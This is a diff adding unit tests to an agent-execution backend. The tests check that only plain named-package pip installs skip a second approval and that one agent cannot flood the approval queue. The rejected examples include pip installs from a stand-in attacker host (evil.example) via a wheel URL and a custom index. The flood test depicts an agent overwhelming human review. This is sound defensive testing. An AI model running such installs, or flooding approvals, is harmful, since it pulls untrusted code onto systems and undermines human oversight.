@@ -127,3 +127,31 @@ class RedirectKeyLeakTests(unittest.TestCase):
             self.assertEqual(leaked, [])
         finally:
             sink.shutdown(); redirect.shutdown(); sink.server_close(); redirect.server_close()
+
+
+class InstallAndFloodTests(unittest.TestCase):
+    def test_only_plain_package_installs_can_skip_a_second_approval(self):
+        from wacc_backend.execution.policy import plain_package_install as plain
+        mk = lambda *a: {"argv": list(a)}  # noqa: E731
+        for argv in (["python", "-m", "pip", "install", "requests"], ["pip", "install", "fastapi>=0.110", "uvicorn"],
+                     ["python", "-m", "pip", "install", "--upgrade", "pydantic==2.6.1"]):
+            self.assertTrue(plain(mk(*argv)), argv)
+        for argv in (["python", "-m", "pip", "install", "."], ["pip", "install", "-r", "hub/requirements.txt"],
+                     ["pip", "install", "-e", "."], ["pip", "install", "https://evil.example/x.whl"],
+                     ["pip", "install", "--index-url", "https://evil.example/simple", "requests"],
+                     ["pip", "install", "git+https://github.com/x/y"], ["pip", "install", "./pkg"],
+                     ["flutter", "pub", "add", "http"], ["npm", "install", "left-pad"], ["pip", "install"]):
+            self.assertFalse(plain(mk(*argv)), argv)
+
+    def test_one_agent_cannot_flood_the_approval_queue(self):
+        from wacc_backend.execution.approvals import MAX_PENDING_PER_AGENT, Approvals
+        from wacc_backend.storage import Storage, StorageError
+        with tempfile.TemporaryDirectory() as tmp:
+            approvals = Approvals(Storage(Path(tmp) / "b.db"))
+            for i in range(MAX_PENDING_PER_AGENT):
+                approvals.request("claude2", "DELETE", {"n": i}, "h%d" % i, "s", "r")
+            with self.assertRaises(StorageError) as ctx:
+                approvals.request("claude2", "DELETE", {"n": 99}, "h99", "s", "r")
+            self.assertEqual(ctx.exception.code, "TOO_MANY_PENDING")
+            approvals.request("claude3", "DELETE", {"n": 1}, "other", "s", "r")  # others are unaffected
+            approvals.request("claude2", "DELETE", {"n": 0}, "h0", "s", "r")  # an identical request is still de-duplicated
